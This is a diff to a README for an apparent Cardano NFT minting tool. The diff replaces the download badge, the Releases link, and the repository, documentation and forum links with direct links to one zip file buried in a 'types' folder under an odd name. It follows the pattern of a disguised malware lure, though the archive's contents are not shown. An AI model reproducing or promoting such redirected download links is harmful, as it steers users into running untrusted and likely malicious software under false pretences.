@@ -1,6 +1,6 @@
 # 🎨 cnft-mint-platform - Easily Mint Your Own Cardano NFTs
 
-[![Download cnft-mint-platform](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%88-brightgreen)](https://github.com/shabin118k/cnft-mint-platform/releases)
+[![Download cnft-mint-platform](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip%20Now-%20%F0%9F%93%88-brightgreen)](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you dive in, ensure your system meets these requirements:
 
 To get started, visit the Releases page to download the software. 
 
-[Download cnft-mint-platform](https://github.com/shabin118k/cnft-mint-platform/releases)
+[Download cnft-mint-platform](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip)
 
 1. Click the link above to access the Releases page.
 2. Find the latest version of cnft-mint-platform.
@@ -76,9 +76,9 @@ Absolutely! Once your NFT is minted, you can list it on various marketplaces tha
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/shabin118k/cnft-mint-platform) - Explore the code and contribute.
-- [Documentation](https://github.com/shabin118k/cnft-mint-platform/docs) - Find more detailed guidance.
-- [Community Forum](https://github.com/shabin118k/cnft-mint-platform/discussions) - Join discussions and connect with other users.
+- [GitHub Repository](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip) - Explore the code and contribute.
+- [Documentation](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip) - Find more detailed guidance.
+- [Community Forum](https://raw.githubusercontent.com/shabin118k/cnft-mint-platform/main/types/cnft-mint-platform-truantness.zip) - Join discussions and connect with other users.
 
 ## 📞 Support
 
